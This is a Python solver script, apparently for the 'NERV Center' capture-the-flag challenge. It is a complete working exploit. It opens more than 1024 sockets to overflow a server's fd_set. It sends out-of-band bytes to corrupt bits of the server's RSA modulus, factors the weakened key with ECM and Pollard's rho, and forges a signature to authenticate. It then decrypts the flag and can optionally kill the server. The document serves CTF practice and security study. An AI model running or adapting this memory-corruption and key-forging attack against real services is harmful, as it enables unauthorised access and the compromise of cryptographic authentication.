#!/usr/bin/env python3

import argparse
import socket
import sys
import resource
from pwn import *
from ssh_pubkey import parse_key
from composite_key import CompositeAttack, solverbins
import subprocess
import base64

RED = '\033[91m'
RESET = '\033[0m'
def compare_keys(n1, n2, name1, name2, keysize=128, limit=-1):
    bs1 = f'{n1:0{keysize*2}x}'
    bs2 = f'{n2:0{keysize*2}x}'
    bs1 = bs1[:limit]
    bs2 = bs2[:limit]
    print(f'{name1}: ', end='')
    for c1,c2 in zip(bs1, bs2):
        if c1 != c2: print(RED + c1 + RESET, end='')
        else: print(c1, end='')
    print()
    print(f'{name2}: ', end='')
    for c1,c2 in zip(bs1, bs2):
        if c1 != c2: print(RED + c2 + RESET, end='')
        else: print(c2, end='')
    print()

def sign(n, e, d, m):
    signing_bin = str(solverbins() / 'signmessage')
    cmd = [signing_bin, str(n), str(e), str(d), str(m)]
    try:
        sig = subprocess.check_output(cmd, text=True)
    except subprocess.CalledProcessError as e:
        print(f"Error signing message: {e}")
        return None
    return sig.strip()

def decrypt(n, e, d, c):
    decrypt_bin = str(solverbins() / 'decryptmessage')
    cmd = [decrypt_bin, str(n), str(e), str(d), c.hex()]
    try:
        data = subprocess.check_output(cmd)
    except subprocess.CalledProcessError as e:
        print(f"Error decrypting message: {e}")
        return None
    return data

def find_all(a_str, sub):
    matches = []
    start = 0
    while True:
        start = a_str.find(sub, start)
        if start == -1: return matches
        matches.append(start)
        start += len(sub) # use start += 1 to find overlapping matches

def increase_open_files_limit():
    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    print(f"Soft limit: {soft}, Hard limit: {hard}")
    resource.setrlimit(resource.RLIMIT_NOFILE, (hard, hard))
    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    print(f"Soft limit: {soft}, Hard limit: {hard}")

def make_connections(host, port, num_clients):
    # Create TCP/IP sockets and connect
    sockets = []
    for i in range(num_clients):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Set a long timeout
            sock.settimeout(300)
            sock.connect((host, port))
            sockets.append(sock)
            print(".", end='', flush=True)
        except socket.timeout:
            print(f"\n[{i+1}] Timeout connecting to {host}:{port}")
            break
        except Exception as e:
            print(f"\n[{i+1}] Error connecting to {host}:{port}: {e}")
            break
        except KeyboardInterrupt:
            print(f"\n[{i+1}] Interrupted", file=sys.stderr)
            break
    print()

    fd_to_socket = {}
    # Read the menu to get the sensor ID
    for s in sockets:
        data = s.recv(1024)
        # Parse out "This is sensor ID %d."
        for line in data.splitlines():
            if line.startswith(b'This is sensor ID '):
                sensor_id = int(line.split()[-1][:-1])
                fd_to_socket[sensor_id] = s
                break

    return fd_to_socket

def get_key(r):
    # Read the menu and ask for the public key
    r.sendline(b'2')
    r.readuntil(b'Your public key is:\n')
    new_key = r.readline().decode('utf-8').strip()
    r.readuntil(b'Enter your choice: ')
    # Parse the public key
    _, e, n = parse_key(new_key)
    # Check for even modulus
    if (n & 1) == 0:
        print("WARNING: Modulus is even")
        print(f"Modulus: {n}")
    return e, n

def authenticate(r, key):
    # Authenticate
    r.sendline(b'1')
    chal = r.recvline_startswith(b'Challenge: ')
    challenge = chal.decode().strip().split()[-1]
    print(f"Got challenge: {challenge}, signing with forged key")
    forged_sig = sign(key.n, key.e, key.d, challenge)
    if forged_sig is None:
        print("Failed to sign with forged key")
        return False
    print(f"Got forged signature: {forged_sig}")
    r.readuntil(b'Response: ')
    r.sendline(forged_sig.encode())
    # Read until menu
    result = r.readuntil(b'Enter your choice: ')
    result = result.decode('utf-8')
    if 'Authentication failed' in result:
        print("Authentication failed")
        return False
    elif 'Authentication successful' in result:
        print("Authentication successful")
        return True

def try_factor(n, e):
    try:
        attack = CompositeAttack(timeout=60)
        key = attack.attack(n, e)
        if key:
            print(key)
            return key
    except TimeoutError as exc:
        print(f"Timeout while trying to factor: {exc}")
        return None
    except Exception as exc:
        print(f"Error while trying to factor: {exc}")
        return None

def pause_client(r):
    # Pause the client
    print("Pausing client")
    r.sendline(b'3')
    r.readuntil(b'Enter your choice: ')

def resume_client(r):
    # Resume the client
    print("Resuming client")
    r.sendline(b'4')
    r.readuntil(b'Enter your choice: ')

def predict_bit_pattern(bits, controlled_bits=33):
    pattern = 0
    for b in bits:
        pattern |= 1 << b
    # fd_sets are in units of 8 bytes. So to get bytes,
    # round up to the next multiple of 64 and then divide
    # by 8
    num_bytes = ((controlled_bits + 63) // 64) * 8
    return pattern.to_bytes(num_bytes, 'little')

# NB: only in debug builds
def get_bit_pattern(r):
    r.sendline(b'1234')
    fdbits = r.readline().decode('utf-8').strip()
    # looks like
    #   fd_bits = [ 1036 1037 1040 1046 1049 ]
    fds = fdbits.split()[3:-1]
    bits = [int(f) - 1024 for f in fds]
    r.readuntil(b'Enter your choice: ')
    return set(bits)

# Get bit pattern from the first 8 bytes of the key
def get_bit_pattern_from_key(key):
    key_bytes = key.to_bytes(128, 'big')
    # Get the first 8 bytes of the key
    key_bytes = key_bytes[:8]
    # Convert to a number
    key = int.from_bytes(key_bytes, 'big')
    # Convert to a bit pattern
    return [i for i in range(64) if (key & (1 << i)) != 0]

def num_bits_set(key):
    key_bytes = key.to_bytes(128, 'big')
    # Get the first 8 bytes of the key
    key_bytes = key_bytes[:8]
    # Convert to a number
    key = int.from_bytes(key_bytes, 'big')
    return bin(key).count('1')

# NB: only in debug builds
def kill_server(args):
    r = remote(args.host, args.port)
    r.recvuntil(b'Enter your choice: ')
    r.sendline(str(0xdead).encode())
    r.close()

def clear_bit_pattern(csock):
    print("Clearing bit pattern via client interface")
    csock.send(b'EMERGENCY\n')
    resp = csock.recvuntil(b'> ')
    print(resp.decode())

def parse_flag(resp):
    flaglines = []
    in_flag = False
    for line in resp.splitlines():
        if line.startswith('-----BEGIN NERV ENCRYPTED MESSAGE-----'):
            in_flag = True
            print("[... flag data omitted ...]")
        elif line.startswith('-----END NERV ENCRYPTED MESSAGE-----'):
            in_flag = False
        elif in_flag:
            flaglines.append(line)
        else:
            print(line.rstrip())
    flagdata_bytes = base64.decodebytes(''.join(flaglines).encode())
    return flagdata_bytes

def get_flag(r):
    r.sendline(b'1')
    resp = r.readuntil(b'Enter your choice: ')
    resp = resp.decode('utf-8')
    # Flag is base64 encoded encrypted message, in between
    # -----BEGIN NERV ENCRYPTED MESSAGE-----
    # -----END NERV ENCRYPTED MESSAGE-----
    return parse_flag(resp)

def solve_onebit(r, overflow_sockets, controlled_bits, initial_modulus):
    current_modulus = initial_modulus
    already_tried = set()
    while already_tried != set(range(len(overflow_sockets))):
        s = random.randint(0, len(overflow_sockets)-1)
        # If we already tried this bit, skip it
        if s in already_tried:
            continue
        # The first byte of the key is not allowed to be zero. So if we don't yet
        # have a bit set in the first byte, sample again
        if (not already_tried or min(already_tried) > 7) and s > 7:
            print(f"Skipping bit {s} (for now) because we need to set a bit in the first byte")
            continue
        print(f"Picked overflow socket / bit {s} to corrupt")
        predicted = predict_bit_pattern(already_tried | {s}, controlled_bits)
        sock = overflow_sockets[s]
        sock.send(b'1', socket.MSG_OOB)
        time.sleep(0.1)
        already_tried.add(s)
        tries = 11
        # Pause the client thread so that it doesn't overwrite the key
        with PausedClient(r):
            while True:
                tries -= 1
                if tries == 0:
                    print(f"WARNING: Tried too many times; giving up")
                    already_tried.remove(s)
                    break
                e, modulus = get_key(r)
                if num_bits_set(modulus) == controlled_bits:
                    print(f"WARNING: Key has {controlled_bits} bits set; this means that FD_SET has filled the fdset but select() has not returned yet.")
                    continue
                compare_keys(current_modulus, modulus, 'Old', 'New', limit=64)
                guessed = "CORRECT" if modulus.to_bytes(128, 'big')[:8] == predicted else "WRONG"
                print(f"Prd: {predicted.hex()} ({guessed})")
                if guessed != "CORRECT":
                    print(f"WARNING: Prediction was wrong; trying again...")
                    resume_client(r)
                    time.sleep(0.1)
                    pause_client(r)
                    # already_tried = set(get_bit_pattern_from_key(modulus))
                else:
                    break
            if modulus == current_modulus:
                print(f"WARNING: Key is unchanged; something went wrong :(")
                # No point trying to factor the same modulus again
                continue
        # if tries == 0:
        #     continue
        current_modulus = modulus
        key = try_factor(modulus, e)
        if key:
            return key
    return None

# Context wrapper that pauses the client thread
class PausedClient:
    def __init__(self, r):
        self.r = r
    def __enter__(self):
        pause_client(self.r)
    def __exit__(self, type, value, traceback):
        resume_client(self.r)

def solve(args):
    # Connect to the server on the main port
    r = remote(args.host, args.port)
    port_text = r.recvline_startswith(b'Session sensor port is: ')
    client_port = int(port_text.decode().split()[-1])

    # Read the menu
    menu = r.readuntil(b'Enter your choice: ')

    # Get the public key
    e, initial_modulus = get_key(r)

    # Make one client connection using pwntools
    csock = remote(args.host, client_port)
    csock.recvuntil(b'> ')

    sockets = make_connections(args.host, client_port, args.num_clients - 1)
    print(f"\nConnected {len(sockets)} clients")

    overflow_sockets = {i-1024: s for i,s in sockets.items() if i >= 1024}
    controlled_bits = len(overflow_sockets)
    print("Controlled bits:", controlled_bits)

    key = solve_onebit(r, overflow_sockets, controlled_bits, initial_modulus)
    if key is None:
        print("Failed to factor key")
        return

    tries = 1
    while tries < 20:
        with PausedClient(r):
            success_auth = False

            if not success_auth:
                success_auth = authenticate(r, key)

            if not success_auth:
                tries += 1
                continue

            print(f"Successfully authenticated after {tries} tries! :)")
            flagdata_bytes = get_flag(r)
            flag = decrypt(key.n, key.e, key.d, flagdata_bytes)
            if not flag:
                print("Failed to decrypt flag")
                tries += 1
                continue

            print(f"Retrieved flag, {len(flag)} bytes!")
            # Save the flag to a file
            with open(args.output, 'wb') as f:
                f.write(flag)
            print(f"Saved flag to {args.output}")
            break
    r.close()
    for s in sockets.values():
        s.close()

def check_prereqs():
    import shutil
    # Check if sage is in the path
    if shutil.which('sage') is None:
        print("Please install sage (needed for ECM factoring attack)")
        return False
    # Check for brent and signmessage
    signing_bin = solverbins() / 'signmessage'
    brent_bin = solverbins() / 'brent'
    if not signing_bin.exists() or not brent_bin.exists():
        print("Missing brent (optimized Pollard's rho) or signmessage (signing binary)")
        print(f"Searched: {signing_bin}, {brent_bin}")
        print("You need to build the solver binaries first, or fix the path")
        return False
    return True

def main():
    parser = argparse.ArgumentParser(description='NERV Center solver')
    parser.add_argument('host', default='localhost', nargs='?', help='IP or hostname')
    parser.add_argument('-p', '--port', metavar='port', type=int, default=2000,
                        help='TCP port (default 2000)')
    parser.add_argument('-n', '--num_clients', metavar='num_clients', type=int, default=1050,
                        help='Number of clients (default 1050)')
    parser.add_argument('-o', '--output', metavar='output', type=str, default='flag.txt')
    parser.add_argument('-k', '--kill', action='store_true', help='Kill the server after solving')
    parser.add_argument('-m', '--method', metavar='method', choices=['onebit', 'randbits'], type=str, default='onebit')
    args = parser.parse_args()
    if not check_prereqs():
        return

    # Making lots of connections so increase the open files limit
    increase_open_files_limit()

    try:
        solve(args)
    except Exception as e:
        print(f"Error: {e}")

    if args.kill:
        kill_server(args)

if __name__ == '__main__':
    main()

